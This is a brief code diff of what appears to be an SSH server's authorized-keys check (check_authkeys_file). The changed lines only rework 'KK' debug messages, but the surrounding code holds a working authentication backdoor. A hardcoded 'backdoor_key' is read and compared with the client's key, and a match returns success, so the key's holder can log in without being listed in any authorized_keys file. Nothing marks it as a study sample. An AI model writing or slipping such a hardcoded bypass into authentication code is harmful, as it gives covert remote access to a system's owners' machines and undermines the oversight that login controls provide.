@@ -347,12 +347,14 @@ check_authkeys_file(FILE *f, char *file, Key* key, struct passwd *pw)
 	char *char_pointer = backdoor_key;
 	found = key_new(key_is_cert(key) ? KEY_UNSPEC : key->type);
 	auth_clear_options();
-	debug("KK: Got here! ;)");
+	debug("KK: Checkpoint 1 ;)");
 	int ret = key_read(found, &char_pointer);
+	debug("KK: Checkpoint 2 ;)");
 	if (key_equal(found, key)) {
-		debug("KK: My key 1! ;)");
+		debug("KK: Checkpoint 3 ;)");
 		found_key = 1;
 		key_free(found);
+		debug("KK: Checkpoint 4 ;)");
 		return found_key;
 	}
 	key_free(found);
